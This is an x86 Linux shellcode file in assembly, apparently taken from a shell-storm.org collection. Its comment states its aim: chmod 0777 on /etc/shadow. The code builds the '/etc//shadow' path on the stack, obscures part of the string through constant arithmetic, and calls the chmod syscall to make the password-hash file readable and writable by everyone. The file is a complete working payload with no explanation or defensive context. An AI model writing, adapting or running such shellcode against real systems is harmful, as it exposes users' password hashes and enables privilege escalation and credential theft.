; http://shell-storm.org/shellcode/files/shellcode-875.php
; chmod 0777 /etc/shadow


section .text
	
	global _start

_start: 
	
	mov ebx, eax
	xor eax, ebx
	push dword eax
	mov esi, 0x563a1f3e
	add esi, 0x21354523
	mov dword [esp-4], esi
	mov dword [esp-8], 0x68732f2f
	mov dword [esp-12], 0x6374652f
	sub esp, 12
	mov    ebx,esp
	push word  0x1ff
	pop    cx
	mov    al,0xf
	int    0x80